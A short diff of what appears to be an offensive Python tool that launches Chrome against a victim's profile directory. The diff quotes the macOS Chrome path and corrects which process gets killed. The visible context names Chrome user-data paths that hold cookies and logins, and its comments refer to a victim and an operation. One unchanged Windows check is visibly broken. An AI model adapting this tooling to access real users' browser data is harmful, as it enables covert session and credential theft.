@@ -23,7 +23,7 @@ if sys.platform.startswith("linux"):
     USER_DATA_DIR = "$HOME/.config/google-chrome/"
 
 elif sys.platform == "darwin":
-    CHROME_CMD = "/Applications/Google Chrome.app/Contents/MacOS/Google Chrome"
+    CHROME_CMD = "'/Applications/Google Chrome.app/Contents/MacOS/Google Chrome'"
     USER_DATA_DIR = "$HOME/Library/Application Support/Google/Chrome"
 
 elif sys.platform.startswith == "win":
@@ -127,7 +127,7 @@ def cleanup(chrome_process):
     # I SURE HOPE there's no race condition, causing this to kill some other
     # innocent PID, crashing the victim's computer and ruining your operation.
 
-    os.kill(chrome_process.pid + 1, signal.SIGKILL)
+    os.kill(chrome_process.pid, signal.SIGKILL)
 
     # If we copied a Profile's User Data Directory somewhere, clean it up.
     if fake_user_data_dir is not None:
